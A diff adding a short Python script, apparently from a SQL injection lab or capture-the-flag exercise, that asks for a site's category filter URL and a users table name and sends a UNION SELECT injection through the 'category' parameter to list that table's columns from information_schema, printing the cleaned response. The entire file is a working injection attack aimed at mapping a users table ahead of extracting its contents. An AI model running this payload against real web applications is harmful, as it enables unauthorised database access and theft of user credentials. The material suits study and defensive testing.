@@ -1,0 +1,14 @@
+import requests
+import re
+
+filter_url = input("Enter the category filter URL (ending at /filter): ")
+users_table = input("Enter the users table name you found: ")
+
+def clean(text):
+    text = re.sub(r'<[^>]+>', '\n', text)
+    return "\n".join(line.strip() for line in text.splitlines() if line.strip())
+
+response = requests.get(filter_url, params={
+    "category": f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{users_table}'--"
+})
+print(clean(response.text))
